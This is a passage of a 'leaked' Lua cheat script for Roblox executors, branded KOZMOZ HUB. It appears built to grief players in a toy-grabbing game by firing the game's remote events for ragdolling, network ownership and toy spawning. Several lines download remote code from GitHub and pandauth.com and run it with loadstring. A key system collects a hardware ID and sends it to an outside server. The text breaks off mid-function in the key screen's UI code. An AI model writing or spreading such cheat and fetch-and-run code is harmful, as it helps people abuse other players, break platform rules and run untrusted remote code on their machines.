-- leaked by virck

lrs = game:GetService("ReplicatedStorage")

u = loadstring(game:HttpGet(('https://raw.githubusercontent.com/fiiremax/Scripts/refs/heads/master/Scriptnew/GitHub/Scripts/Module.lua')))()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()

var      = getgenv().var
w        = workspace
plr      = LocalPlayer
IsAround = u.IsAround
GPNames  = u.GPNames
inpast   = u.inpast
ippp     = u.IPPP
SICF     = u.SICF
FINF     = u.FINF
SPE      = u.SPE
MBP      = u.MBP
wfc      = u.wfc
fps      = u.fps
FMC      = u.FMC
timer    = u.tmr
cm       = u.cm
tp       = u.tp
tm       = u.tm
p        = u.p
SoundPart = Item and Item:FindFirstChild("Hitbox")
Player = game.Players.LocalPlayer
PersistentToggles = {}
_G.AutoRestoredGucci = true

function SaveToggleState(name, value)
    PersistentToggles[name] = value
end

function RestoreToggles()
    task    .wait(0.5)
    for name, value in pairs(PersistentToggles) do
        if Toggles[name] and Toggles[name].Value ~= value then
            pcall(function()
                Toggles[name]:SetValue(value)
            end)
        end
    end
    SaveManager:LoadAutoloadConfig()
    task.spawn(function()
        task.wait(4.5)
        local gucciToggles = {"GucciBlobman", "GucciTractor", "GucciTrainToggle"}
        for _, toggleName in ipairs(gucciToggles) do
            if Toggles[toggleName] and Toggles[toggleName].Value then
                Toggles[toggleName]:SetValue(false)
                task.wait()
                Toggles[toggleName]:SetValue(true)
            end
        end
    end)
end

function getChar()
    return Players.LocalPlayer and Players.LocalPlayer.Character
end

function getHum()
    local c = getChar()
    return c and c:FindFirstChildOfClass("Humanoid")
end

function getHRP()
    local c = getChar()
    return c and c:FindFirstChild("HumanoidRootPart")
end

function refreshGlobals()
    char = getChar()
    hum = getHum()
    HRP = getHRP()
    local me = Players.LocalPlayer
    if me then
        inv = workspace:FindFirstChild(me.Name.."SpawnedInToys") 
              or workspace:WaitForChild(me.Name.."SpawnedInToys", 5)
    end
end

function getInv()
    local me = Players.LocalPlayer
    if not me then return nil end
    return workspace:FindFirstChild(me.Name.."SpawnedInToys") 
           or workspace:WaitForChild(me.Name.."SpawnedInToys", 5)
end

function gblob()
    local char = getChar()
    if not char then return nil end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return nil end
    seatPart = hum.SeatPart
    if seatPart and seatPart.Parent and seatPart.Parent.Parent then
        if seatPart.Parent.Name == "CreatureBlobman" then
            return seatPart.Parent
        end
    end
    return nil
end

function disc(name)
    for i,v in cons do
        if i == name then
            v:Disconnect()
        end
    end
end

function getplot()
    local me = Players.LocalPlayer
    if not me then return nil end
    for i = 1, 5 do
        local plot = workspace.Plots:FindFirstChild("Plot"..i)
        if plot and plot:FindFirstChild("PlotSign") then
            local owners = plot.PlotSign:FindFirstChild("ThisPlotsOwners")
            if owners then
                for _, v in pairs(owners:GetChildren()) do
                    if v:IsA("StringValue") and v.Value:find(me.Name) then
                        return plot
                    end
                end
            end
        end
    end
    return nil
end

function sno(obj)
    if not obj then return end
    SetNetOwner:FireServer(obj, obj.CFrame)
end

function spawntoy(toy, cf)
    local me = Players.LocalPlayer
    if not me then return nil end
    if not me.CanSpawnToy.Value then
        me.CanSpawnToy.Changed:Wait()
    end
    local currentInv = getInv()
    if not currentInv then return nil end
    local t
    local toyadded
    toyadded = currentInv.ChildAdded:Connect(function(c)
        if c.Name == toy then
            t = c
            toyadded:Disconnect()
        end
    end)
    task.spawn(function()
        SpawnToy:InvokeServer(toy, cf, Vector3.new(0,0,0))
    end)
    time = tick() + 1
    repeat task.wait() until t or tick() > time
    if toyadded then pcall(function() toyadded:Disconnect() end) end
    if t then
        return t
    else
        local plot = getplot()
        if plot then
            local plotItems = workspace:FindFirstChild("PlotItems")
            if plotItems then
                local plotFolder = plotItems:FindFirstChild(plot.Name)
                if plotFolder then
                    return plotFolder:FindFirstChild(toy) or plotFolder:WaitForChild(toy, 0.5)
                end
            end
        end
    end
    return nil
end

function grab(obj)
    if obj and obj:FindFirstChild("HoldPart") and obj.HoldPart:FindFirstChild("HoldItemRemoteFunction") then
        obj.HoldPart.HoldItemRemoteFunction:InvokeServer(obj, getChar())
    end
end

function drop(obj, cf)
    if obj and obj:FindFirstChild("HoldPart") and obj.HoldPart:FindFirstChild("DropItemRemoteFunction") then
        obj.HoldPart.DropItemRemoteFunction:InvokeServer(obj, cf, Vector3.new(0, 0, 0))
    end
end

function stvel(hrp)
    if not hrp then return end
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
end

function getname(v)
    if type(v) == "string" then
        local match = v:match("@([%w_]+)")
        if match then return match end
        local parenMatch = v:match("%(([%w_]+)%)")
        if parenMatch then return parenMatch end
        return v
    end
    return v
end

TweenService = game:GetService("TweenService")
UserInputService = game:GetService("UserInputService")
TextChatService = game:GetService("TextChatService")
RunService = game:GetService("RunService")
rs = game:GetService("ReplicatedStorage")
Players = game:GetService("Players")
Workspace = game:GetService("Workspace")

DestroyToy = rs.MenuToys.DestroyToy
SetNetOwner = rs.GrabEvents.SetNetworkOwner
CreateLine = rs.GrabEvents.CreateGrabLine
DestroyLine = rs.GrabEvents.DestroyGrabLine
SpawnToy = rs.MenuToys.SpawnToyRemoteFunction
Struggle = rs.CharacterEvents.Struggle
Ragdoll = rs.CharacterEvents.RagdollRemote
StickyEvent = rs.PlayerEvents.StickyPartEvent

jerkspeed = 0.1
spinspeed = 10
strength = 300
offset = CFrame.new(0, 15, 0)
local PalletForRagdoll
Seats = {}
WhitelistEnabled = false

Lines = 0
Camera = workspace.CurrentCamera
plr = Players.LocalPlayer
Mouse = plr:GetMouse()
cons = {}
inv = workspace:FindFirstChild(plr.Name.."SpawnedInToys") or workspace:WaitForChild(plr.Name.."SpawnedInToys", 5)

refreshGlobals()

MenuToys = rs:FindFirstChild("MenuToys") or rs:WaitForChild("MenuToys")
GrabEvents = rs:FindFirstChild("GrabEvents") or rs:WaitForChild("GrabEvents")
CharacterEvents = rs:FindFirstChild("CharacterEvents") or rs:WaitForChild("CharacterEvents")
PlayerEvents = rs:FindFirstChild("PlayerEvents") or rs:WaitForChild("PlayerEvents")
BombEvents = rs:FindFirstChild("BombEvents") or rs:WaitForChild("BombEvents")
DataEvents = rs:FindFirstChild("DataEvents") or rs:WaitForChild("DataEvents")
GameCorrectionEvents = rs:FindFirstChild("GameCorrectionEvents") or rs:WaitForChild("GameCorrectionEvents")

Services = {
    TweenService = game:GetService("TweenService"),
    Analytics = game:GetService("RbxAnalyticsService"),
    UserInputService = game:GetService("UserInputService"),
    TextChatService = game:GetService("TextChatService"),
    HttpService = game:GetService("HttpService"),
    RunService = game:GetService("RunService"),
    StarterGui = game:GetService("StarterGui"),
    CoreGui = game:GetService("CoreGui"),
    rs = rs,
    RF = game:GetService("ReplicatedFirst"),
    Players = game:GetService("Players"),
    LocalPlayer = game:GetService("Players").LocalPlayer,
    PlayerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"),
    Workspace = game:GetService("Workspace"),
    TeleportService = game:GetService("TeleportService"),
    SpawnToy = MenuToys:FindFirstChild("SpawnToyRemoteFunction") or MenuToys:WaitForChild("SpawnToyRemoteFunction"),
    DestroyToy = MenuToys:FindFirstChild("DestroyToy") or MenuToys:WaitForChild("DestroyToy"),
    SetNetOwner = GrabEvents:FindFirstChild("SetNetworkOwner") or GrabEvents:WaitForChild("SetNetworkOwner"),
    CreateLine = GrabEvents:FindFirstChild("CreateGrabLine") or GrabEvents:WaitForChild("CreateGrabLine"),
    DestroyLine = GrabEvents:FindFirstChild("DestroyGrabLine") or GrabEvents:WaitForChild("DestroyGrabLine"),
    Struggle = CharacterEvents:FindFirstChild("Struggle") or CharacterEvents:WaitForChild("Struggle"),
    Ragdoll = CharacterEvents:FindFirstChild("RagdollRemote") or CharacterEvents:WaitForChild("RagdollRemote"),
    StopVel = GameCorrectionEvents:FindFirstChild("StopAllVelocity") or GameCorrectionEvents:WaitForChild("StopAllVelocity"),
    UpdLineColor = DataEvents:FindFirstChild("UpdateLineColorsEvent") or DataEvents:WaitForChild("UpdateLineColorsEvent"),
    StickyEvent = PlayerEvents:FindFirstChild("StickyPartEvent") or PlayerEvents:WaitForChild("StickyPartEvent"),
    BombExplode = BombEvents:FindFirstChild("BombExplode") or BombEvents:WaitForChild("BombExplode"),
}

cons = {}
inv = getInv()

plr.CharacterAdded:Connect(function(newChar)
    task.wait(0.1)
    refreshGlobals()
    Movement.currentCharacter = newChar
    Movement.currentHumanoid = getHum()
    Movement.rootPart = getHRP()
    Movement.moveForward = false
    Movement.moveBackward = false
    Movement.moveLeft = false
    Movement.moveRight = false
    local h = getHum()
    if WalkSpeedEnabled and h then h.WalkSpeed = WalkSpeedValue end
    if JumpPowerEnabled and h then h.JumpPower = JumpPowerValue end
end)

plr.CharacterRemoving:Connect(function()
    task.wait()
    refreshGlobals()
end)

PREMIUM_USERS = {
    [10170190382] = { name = "Griefing_lolxd", rank = "Owner", color = Color3.fromRGB(255, 215, 0) },
    [10170190382] = { name = "shavelikea_bomber", rank = "Owner", color = Color3.fromRGB(255, 215, 0) },
}
currentUserId = Services.Players.LocalPlayer.UserId
premiumData = PREMIUM_USERS[currentUserId]
isPremium = premiumData ~= nil

IsPremium = isPremium
PremiumData = premiumData

if isPremium then
    print("[KOZMOZ PREMIUM] Welcome back, " .. premiumData.name .. "!")
end

function LockPremium(featureName)
    if not IsPremium then
        if Library then
        end
        return false
    end
    return true
end

function PremiumText(text)
    return IsPremium and text or "🔒 " .. text .. " (Premium)"
end

--====================================================================
-- [KOZMOZ] PANDA KEY SISTEMI  (PNG-1 tarzi mavi neon tasarim)
--  Akis:  Yukleme ekrani -> Key ekrani -> Hub
--  * Key Panda uzerinden alinir / Panda ile dogrulanir.
--  * Dogru key girilince key + tarih dosyaya kaydedilir.
--  * 20 saat dolmadan script kac kez acilirsa acilsin
--    NE yukleme ekrani NE key ekrani GELMEZ, hub direkt acilir.
--  * 20 saat dolunca (veya hic key girilmemisse) once yukleme
--    ekrani, arkasindan key ekrani tekrar gelir.
--
--  !!! TEK DEGISTIRECEGIN YER ASAGIDAKI SATIR !!!
--  Panda panelinde (pandauth.com) olusturdugun servisin
--  "Identifier / Service ID" degerini tirnak icine aynen yaz.
--  Ornek: Panda'da Identifier'i  kozmoz  yaptiysan hicbir sey
--  degistirmene gerek yok, boyle kalsin.
--====================================================================
getgenv().KozmozPandaServiceID = "kozmoz" -- <<< PANDA SERVICE ID BURAYA

KozmozKeyRememberSeconds = 20 * 60 * 60 -- 20 saat (saniye cinsinden)
KozmozKeyFolder = "KozmozHub"
KozmozKeyFile = KozmozKeyFolder .. "/panda_key.json"
-- true (onerilen): Kayitli key her acilista Panda'dan SESSIZCE dogrulanir;
-- oyuncu hicbir ekran gormez, dogruysa hub direkt acilir.
-- Panda'ya ulasilamazsa (internet/sunucu sorunu) 20 saatlik kayit yine
-- kabul edilir, oyuncu magdur olmaz. Key Panda'da iptal/suresi dolmus
-- cikarsa kayit silinir ve key ekrani gelir.
-- false yaparsan: 20 saat icinde Panda'ya hic sorulmaz, kayda guvenilir.
KozmozKeyRevalidateOnStart = true

KozmozKeyVerified = false
KozmozKeyCancelled = false
KozmozPandaV4 = nil
KozmozKeyLastExpirySeconds = nil

function KozmozKey_Now()
    return os.time()
end

function KozmozKey_ClearSaved()
    pcall(function()
        if delfile and isfile and isfile(KozmozKeyFile) then
            delfile(KozmozKeyFile)
        end
    end)
end

function KozmozKey_LoadSaved()
    if not (isfile and readfile) then return nil end
    local ok, content = pcall(readfile, KozmozKeyFile)
    if not ok or type(content) ~= "string" or content == "" then return nil end
    local ok2, data = pcall(function()
        return Services.HttpService:JSONDecode(content)
    end)
    if not ok2 or type(data) ~= "table" then return nil end
    if type(data.key) ~= "string" or data.key == "" then return nil end
    if type(data.expiresAt) ~= "number" then return nil end
    if KozmozKey_Now() >= data.expiresAt then
        KozmozKey_ClearSaved()
        return nil
    end
    return data
end

function KozmozKey_Save(key)
    if not writefile then return false end
    pcall(function()
        if makefolder and (not isfolder or not isfolder(KozmozKeyFolder)) then
            makefolder(KozmozKeyFolder)
        end
    end)
    local now = KozmozKey_Now()
    -- Kayit suresi: 20 saat. Ama Panda keyinin kendi suresi daha kisa ise
    -- (orn. 12 saatlik key) kayit o sureyle sinirlanir, Panda suresi asilmaz.
    local ttl = KozmozKeyRememberSeconds
    if type(KozmozKeyLastExpirySeconds) == "number" and KozmozKeyLastExpirySeconds > 0 then
        ttl = math.min(ttl, math.floor(KozmozKeyLastExpirySeconds))
    end
    local data = {
        key = key,
        savedAt = now,
        expiresAt = now + ttl,
    }
    local ok = pcall(function()
        writefile(KozmozKeyFile, Services.HttpService:JSONEncode(data))
    end)
    return ok
end

function KozmozKey_GetHWID()
    local ok, id = pcall(function()
        return game:GetService("RbxAnalyticsService"):GetClientId()
    end)
    if ok and id and tostring(id) ~= "" then
        return tostring(id)
    end
    return tostring(Services.LocalPlayer.UserId)
end

function KozmozKey_UrlEncode(text)
    local ok, encoded = pcall(function()
        return Services.HttpService:UrlEncode(tostring(text))
    end)
    if ok and encoded then return encoded end
    return (tostring(text):gsub("[^%w%-_%.~]", function(c)
        return string.format("%%%02X", string.byte(c))
    end))
end

function KozmozKey_LoadPanda()
    -- Resmi Panda-RBLX SDK (PUSL-V4) - Panda'nin onerdigi guncel kutuphane
    if KozmozPandaV4 then return KozmozPandaV4 end
    local ok, src = pcall(function()
        return game:HttpGet("https://secure.pandauth.com/pv4/lib")
    end)
    if not ok or type(src) ~= "string" or src == "" then
        warn("[KOZMOZ KEY] Could not download the Panda-RBLX library, using fallback validation.")
        return nil
    end
    local ok2, lib = pcall(function() return loadstring(src)() end)
    if not ok2 or type(lib) ~= "table" then
        warn("[KOZMOZ KEY] Could not start the Panda-RBLX library, using fallback validation.")
        return nil
    end
    if type(lib.configure) == "function" then
        pcall(function()
            lib.configure({
                serviceId = getgenv().KozmozPandaServiceID,
                debug = false,
                kickOnDetect = false,
            })
        end)
    end
    KozmozPandaV4 = lib
    return lib
end

function KozmozKey_HttpRequest()
    return (syn and syn.request) or (http and http.request) or http_request or request
end

-- Yedek dogrulama: Panda v2_validation adresine POST
-- Donus: "valid" | "invalid" | "service" (servis bulunamadi) | "unknown"
function KozmozKey_ValidateDirect(key)
    local req = KozmozKey_HttpRequest()
    if not req then return "unknown" end
    local bodyJson = nil
    pcall(function()
        bodyJson = Services.HttpService:JSONEncode({
            service = getgenv().KozmozPandaServiceID,
            key = key,
            hwid = KozmozKey_GetHWID(),
        })
    end)
    if not bodyJson then return "unknown" end
    local ok, res = pcall(function()
        return req({
            Url = "https://pandauth.com/v2_validation",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = bodyJson,
        })
    end)
    if not ok or not res or not res.Body then return "unknown" end
    local body = tostring(res.Body)
    if body == "" or body:find("<html") then return "unknown" end
    local ok2, data = pcall(function()
        return Services.HttpService:JSONDecode(body)
    end)
    if not ok2 or type(data) ~= "table" then return "unknown" end
    -- Eski cevap formati
    if data.V2_Authentication ~= nil then
        if data.V2_Authentication == "success" then return "valid" end
        return "invalid"
    end
    -- Guncel cevap formati: { Status=..., Note=..., Expired_At=... }
    if data.Status ~= nil then
        local note = string.lower(tostring(data.Note or ""))
        if data.Status == "Not_Authenticate" then
            if note:find("service not found") or note:find("serviceid is required")
                or note:find("service is required") then
                return "service"
            end
            return "invalid"
        end
        return "valid"
    end
    if data.success == true or data.valid == true then return "valid" end
    if data.success == false or data.valid == false then return "invalid" end
    return "unknown"
end

-- Ana dogrulama: 1) Resmi Panda-RBLX (PUSL-V4)  2) Yedek POST dogrulama
-- Donus: true/false, sebep ("invalid" | "network" | "service" | "empty")
function KozmozKey_Validate(key)
    key = tostring(key or ""):gsub("^%s+", ""):gsub("%s+$", "")
    if key == "" then return false, "empty" end

    local lib = KozmozKey_LoadPanda()
    if lib then
        -- Once validateEx: (dogrulandi mi, sebep, premium mu) dondurur
        if type(lib.validateEx) == "function" then
            local callOk, a, b = pcall(function() return lib.validateEx(key) end)
            if callOk then
                if a == true then
                    pcall(function()
                        local left = lib.getTimeLeft and lib.getTimeLeft()
                        if type(left) == "number" then
                            KozmozKeyLastExpirySeconds = left
                        end
                    end)
                    return true
                end
                if type(a) == "table" then
                    if a.success == true then return true end
                    local r = string.upper(tostring(a.error or a.reason or ""))
                    if r:find("INVALID") or r:find("NO_KEY") then
                        return false, "invalid"
                    end
                    if r:find("NO_SERVICE") then return false, "service" end
                    return false, "network"
                end
                local reason = string.upper(tostring(b or ""))
                if reason == "INVALID_KEY" or reason == "NO_KEY"
                    or reason:find("INVALID") then
                    return false, "invalid"
                end
                if reason == "NO_SERVICE" then return false, "service" end
                if reason ~= "" then return false, "network" end
                -- sebep bos ve sonuc false: kesin karar icin yedek yola dus
            end
        end
        if type(lib.validate) == "function" then
            local callOk, result = pcall(function() return lib.validate(key) end)
            if callOk then
                if result == true then return true end
                if type(result) == "table" then
                    if result.success == true then
                        if type(result.timeLeft) == "number" then
                            KozmozKeyLastExpirySeconds = result.timeLeft
                        end
                        return true
                    end
                    local r = string.upper(tostring(result.error or result.reason or ""))
                    if r:find("INVALID") or r:find("NO_KEY") then
                        return false, "invalid"
                    end
                    if r:find("NO_SERVICE") then return false, "service" end
                    if r ~= "" then return false, "network" end
                end
            end
        end
    end

    local directState = KozmozKey_ValidateDirect(key)
    if directState == "valid" then return true end
    if directState == "invalid" then return false, "invalid" end
    if directState == "service" then return false, "service" end
    return false, "network"
end

function KozmozKey_GetLink()
    local lib = KozmozKey_LoadPanda()
    if lib and type(lib.getKeyUrl) == "function" then
        local ok, link = pcall(function() return lib.getKeyUrl() end)
        if ok and type(link) == "string" and link ~= "" then
            return link
        end
    end
    if lib and type(lib.copyGetKeyUrl) == "function" then
        local ok, link = pcall(function() return lib.copyGetKeyUrl() end)
        if ok and type(link) == "string" and link ~= "" then
            return link
        end
    end
    return "https://pandauth.com/getkey?service="
        .. KozmozKey_UrlEncode(getgenv().KozmozPandaServiceID)
        .. "&hwid=" .. KozmozKey_UrlEncode(KozmozKey_GetHWID())
end

function KozmozKey_Copy(text)
    local cb = setclipboard or toclipboard or set_clipboard
        or (getgenv and getgenv().setclipboard)
        or (Clipboard and Clipboard.set)
    if cb then
        return pcall(function() cb(text) end)
    end
    return false
end

----------------------------------------------------------------
-- KEY EKRANI (PNG-1 tasarimi: KOZMOZ HUB / SECURE ACCESS)
-- Dogrulanana kadar kod burada bekler, hub acilmaz.
----------------------------------------------------------------
function KozmozKey_ShowAndWait()
    local TweenServiceK = Services.TweenService
    local UIS = Services.UserInputService

    local guiParent = Services.CoreGui
    local okHui, hui = pcall(function() return gethui and gethui() end)
    if okHui and hui then guiParent = hui end

    local oldKeyGui = guiParent:FindFirstChild("KozmozKeyScreen")
    if oldKeyGui then oldKeyGui:Destroy() end

    pcall(function()
        UIS.MouseBehavior = Enum.MouseBehavior.Default
        UIS.MouseIconEnabled = true
    end)

    local gui = Instance.new("ScreenGui")
    gui.Name = "KozmozKeyScreen"
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 10001
    gui.ResetOnSpawn = false
    gui.Parent = guiParent

    local dim = Instance.new("Frame")
    dim.Size = UDim2.fromScale(1, 1)
    dim.BackgroundColor3 = Color3.fromRGB(5, 5, 8)
    dim.BackgroundTransparency = 0.35
    dim.BorderSizePixel = 0
    dim.Parent = gui

    local viewport = Vector2.new(1280, 720)
    pcall(function()
        if workspace.CurrentCamera then
            viewport = workspace.CurrentCamera.ViewportSize
        end
    end)
    local cardW = math.clamp(viewport.X * 0.92, 320, 580)
    local cardH = math.clamp(cardW * 0.68, 340, 400)

    local card = Instance.new("Frame")
    card.Name = "Card"
    card.AnchorPoint = Vector2.new(0.5, 0.5)
    card.Position = UDim2.fromScale(0.5, 0.54)
    card.Size = UDim2.fromOffset(cardW, cardH)
    card.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
    card.BackgroundTransparency = 1
    card.BorderSizePixel = 0
    card.ClipsDescendants = true
    card.Parent = gui

    local cardCorner = Instance.new("UICorner")
    cardCorner.CornerRadius = UDim.new(0, 12)
    cardCorner.Parent = card

    local cardGradient = Instance.new("UIGradient")
    cardGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 18, 14)),
        ColorSequenceKeypoint.new(0.55, Color3.fromRGB(12, 12, 12)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(8, 8, 8)),
    })
    cardGradient.Rotation = 90
    cardGradient.Parent = card

    local cardStroke = Instance.new("UIStroke")
    cardStroke.Color = Color3.fromRGB(255, 160, 0)
    cardStroke.Thickness = 2
    cardStroke.Transparency = 1
    cardStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    cardStroke.Parent = card

    local topLine = Instance.new("Frame")
    topLine.Size = UDim2.new(1, 0, 0, 3)
    topLine.BackgroundColor3 = Color3.fromRGB(255, 160, 0)
    topLine.BorderSizePixel = 0
    topLine.Parent = card
    local topGradient = Instance.new("UIGradient")
    topGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(160, 85, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 190, 80)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(160, 85, 0)),
    })
    topGradient.Parent = topLine

    -- Ust bolum (surukleme alani)
    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 112)
    header.BackgroundTransparency = 1
    header.BorderSizePixel = 0
    header.Parent = card

    local circle = Instance.new("Frame")
    circle.Size = UDim2.fromOffset(78, 78)
    circle.Position = UDim2.new(0, 26, 0, 20)
    circle.BackgroundColor3 = Color3.fromRGB(22, 17, 10)
    circle.BorderSizePixel = 0
    circle.Parent = header
    local circleCorner = Instance.new("UICorner")
    circleCorner.CornerRadius = UDim.new(0.5, 0)
    circleCorner.Parent = circle
    local circleStroke = Instance.new("UIStroke")
    circleStroke.Color = Color3.fromRGB(255, 160, 0)
    circleStroke.Thickness = 2
    circleStroke.Parent = circle

    local logo = Instance.new("ImageLabel")
    logo.Image = "rbxassetid://83405026470410"
    logo.BackgroundTransparency = 1
    logo.Size = UDim2.fromScale(0.86, 0.86)
    logo.Position = UDim2.fromScale(0.5, 0.5)
    logo.AnchorPoint = Vector2.new(0.5, 0.5)
    logo.ScaleType = Enum.ScaleType.Fit
    logo.Parent = circle
    local logoCorner = Instance.new("UICorner")
    logoCorner.CornerRadius = UDim.new(0.5, 0)
    logoCorner.Parent = logo

    local titleSize = (cardW < 430) and 25 or 34
    local title = Instance.new("TextLabel")
    title.Text = "KOZMOZ HUB"
    title.Font = Enum.Font.SciFi
    title.TextSize = titleSize
    title.TextScaled = true
    title.TextWrapped = false
    title.TextColor3 = Color3.fromRGB(255, 160, 0)
    title.BackgroundTransparency = 1
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Size = UDim2.new(1, -275, 0, 42)
    title.Position = UDim2.new(0, 120, 0, 30)
    title.Parent = header

    local subtitle = Instance.new("TextLabel")
    subtitle.Text = "SECURE ACCESS  |  KEY SYSTEM"
    subtitle.Font = Enum.Font.Code
    subtitle.TextSize = (cardW < 430) and 12 or 15
    subtitle.TextColor3 = Color3.fromRGB(255, 190, 90)
    subtitle.BackgroundTransparency = 1
    subtitle.TextXAlignment = Enum.TextXAlignment.Left
    subtitle.Size = UDim2.new(1, -200, 0, 22)
    subtitle.TextWrapped = false
    subtitle.Position = UDim2.new(0, 122, 0, 74)
    subtitle.Parent = header

    local chip = Instance.new("TextLabel")
    chip.Text = "20 HOURS"
    chip.Font = Enum.Font.Code
    chip.TextSize = 11
    chip.TextColor3 = Color3.fromRGB(255, 200, 110)
    chip.BackgroundColor3 = Color3.fromRGB(40, 26, 8)
    chip.BorderSizePixel = 0
    chip.AnchorPoint = Vector2.new(1, 0)
    chip.Size = UDim2.fromOffset(66, 20)
    chip.Position = UDim2.new(1, -58, 0, 20)
    chip.Parent = header
    local chipCorner = Instance.new("UICorner")
    chipCorner.CornerRadius = UDim.new(0, 6)
    chipCorner.Parent = chip
    local chipStroke = Instance.new("UIStroke")
    chipStroke.Color = Color3.fromRGB(255, 160, 0)
    chipStroke.Thickness = 1
    chipStroke.Parent = chip
    chip.Visible = cardW >= 460

    local kozCancelled = false

    -- Close (X) button - top right. Closes the key screen AND stops the
    -- script: the hub does NOT load without a key.
    local closeBtn = Instance.new("TextButton")
    closeBtn.Name = "CloseButton"
    closeBtn.Text = "×"
    closeBtn.Font = Enum.Font.Code
    closeBtn.TextSize = 24
    closeBtn.TextColor3 = Color3.fromRGB(255, 170, 40)
    closeBtn.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
    closeBtn.BorderSizePixel = 0
    closeBtn.AnchorPoint = Vector2.new(1, 0)
    closeBtn.Size = UDim2.fromOffset(36, 36)
    closeBtn.Position = UDim2.new(1, -12, 0, 12)
    closeBtn.ZIndex = 5
    closeBtn.Parent = card
    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 8)
    closeCorner.Parent = closeBtn
    local closeStroke = Instance.new("UIStroke")
    closeStroke.Color = Color3.fromRGB(255, 160, 0)
    closeStroke.Thickness = 1
    closeStroke.Transparency = 0.4
    closeStroke.Parent = closeBtn
    closeBtn.MouseEnter:Connect(function()
        closeBtn.BackgroundColor3 = Color3.fromRGB(120, 35, 25)
        closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    end)
    closeBtn.MouseLeave:Connect(function()
        closeBtn.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
        closeBtn.TextColor3 = Color3.fromRGB(255, 170, 40)
    end)

    local divider = Instance.new("Frame")
    divider.Size = UDim2.new(1, -48, 0, 1)
    divider.Position = UDim2.new(0, 24, 0, 118)
    divider.BackgroundColor3 = Color3.fromRGB(255, 160, 0)
    divider.BackgroundTransparency = 0.35
    divider.BorderSizePixel = 0
    divider.Parent = card

    local prompt = Instance.new("TextLabel")
    prompt.Text = "Enter your key to continue"
    prompt.Font = Enum.Font.Code
    prompt.TextSize = 17
    prompt.TextColor3 = Color3.fromRGB(255, 190, 90)
    prompt.BackgroundTransparency = 1
    prompt.TextXAlignment = Enum.TextXAlignment.Left
    prompt.Size = UDim2.new(1, -64, 0, 24)
    prompt.Position = UDim2.new(0, 32, 0, 134)
    prompt.Parent = card

    local keyBox = Instance.new("TextBox")
    keyBox.Name = "KeyBox"
    keyBox.PlaceholderText = "Paste your key here..."
    keyBox.Text = ""
    keyBox.ClearTextOnFocus = false
    keyBox.Font = Enum.Font.Code
    keyBox.TextSize = 19
    keyBox.TextColor3 = Color3.fromRGB(255, 205, 130)
    keyBox.PlaceholderColor3 = Color3.fromRGB(165, 145, 120)
    keyBox.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
    keyBox.TextXAlignment = Enum.TextXAlignment.Left
    keyBox.Size = UDim2.new(1, -64, 0, 56)
    keyBox.Position = UDim2.new(0, 32, 0, 166)
    keyBox.Parent = card
    local keyCorner = Instance.new("UICorner")
    keyCorner.CornerRadius = UDim.new(0, 9)
    keyCorner.Parent = keyBox
    local keyStroke = Instance.new("UIStroke")
    keyStroke.Color = Color3.fromRGB(255, 160, 0)
    keyStroke.Transparency = 0.35
    keyStroke.Thickness = 1.5
    keyStroke.Parent = keyBox
    local keyPadding = Instance.new("UIPadding")
    keyPadding.PaddingLeft = UDim.new(0, 16)
    keyPadding.PaddingRight = UDim.new(0, 12)
    keyPadding.Parent = keyBox

    local function makeButton(text, xScale, xOffset, colorA, colorB, textColor)
        local btn = Instance.new("TextButton")
        btn.Text = text
        btn.Font = Enum.Font.Code
        btn.TextSize = 21
        btn.TextColor3 = textColor or Color3.fromRGB(255, 255, 255)
        btn.AutoButtonColor = true
        btn.BackgroundColor3 = colorA
        btn.BorderSizePixel = 0
        btn.Size = UDim2.new(0.5, -40, 0, 54)
        btn.Position = UDim2.new(xScale, xOffset, 0, 238)
        btn.Parent = card
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 9)
        corner.Parent = btn
        local grad = Instance.new("UIGradient")
        grad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, colorA),
            ColorSequenceKeypoint.new(1, colorB),
        })
        grad.Rotation = 0
        grad.Parent = btn
        local btnStroke = Instance.new("UIStroke")
        btnStroke.Color = colorB
        btnStroke.Thickness = 1
        btnStroke.Transparency = 0.3
        btnStroke.Parent = btn
        return btn
    end

    local unlockBtn = makeButton("UNLOCK", 0, 32,
        Color3.fromRGB(255, 140, 0), Color3.fromRGB(255, 185, 65),
        Color3.fromRGB(25, 15, 0))
    local getKeyBtn = makeButton("↗  GET KEY", 0.5, 8,
        Color3.fromRGB(28, 28, 28), Color3.fromRGB(45, 32, 12),
        Color3.fromRGB(255, 170, 40))

    local status = Instance.new("TextLabel")
    status.Text = "Click \"GET KEY\" to get your key from Panda, then paste it here."
    status.Font = Enum.Font.Code
    status.TextSize = 14
    status.TextColor3 = Color3.fromRGB(193, 205, 205)
    status.BackgroundTransparency = 1
    status.TextWrapped = true
    status.Size = UDim2.new(1, -48, 0, 38)
    status.Position = UDim2.new(0, 24, 0, 306)
    status.Parent = card

    local footer = Instance.new("TextLabel")
    footer.Text = "KOZMOZ  •  PANDA KEY SYSTEM  •  KEY IS VALID FOR 20 HOURS"
    footer.Font = Enum.Font.Code
    footer.TextSize = 11
    footer.TextColor3 = Color3.fromRGB(128, 128, 128)
    footer.BackgroundTransparency = 1
    footer.Size = UDim2.new(1, -48, 0, 16)
    footer.Position = UDim2.new(0, 24, 1, -30)
    footer.Parent = card

    -- Surukleme (baslik bolgesinden)
    local dragging = false
